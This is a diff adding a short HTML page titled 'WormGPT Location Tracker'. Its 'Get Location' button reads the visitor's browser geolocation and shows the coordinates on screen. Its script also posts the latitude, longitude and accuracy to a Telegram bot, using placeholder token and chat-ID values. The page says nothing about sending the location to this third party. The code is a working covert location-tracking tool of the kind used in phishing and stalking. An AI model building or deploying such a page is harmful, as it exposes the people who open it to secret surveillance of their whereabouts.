@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>WormGPT Location Tracker</title>
+    <style>
+      body {
+        text-align: center;
+        margin-top: 50px;
+      }
+      .button {
+        background-color: #4CAF50;
+        border: none;
+        color: white;
+        padding: 15px 32px;
+        text-align: center;
+        text-decoration: none;
+        display: inline-block;
+        font-size: 16px;
+        margin: 4px 2px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>WormGPT Location Tracker</h1>
+    <button class="button" onclick="getLocation()">Get Location</button>
+    <p id="demo"></p>
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+          document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+        }
+      }
+
+      function showPosition(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        const url = `https://api.telegram.org/botYOUR_TELEGRAM_BOT_API_TOKEN/sendMessage`;
+        const data = {
+          chat_id: 'YOUR_CHAT_ID',
+          text: `New user location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}`
+        };
+
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        })
+        .catch(error => {
+          console.log(error);
+        });
+
+        document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon + "<br>Accuracy: " + accuracy;
+      }
+    </script>
+  </body>
+</html>
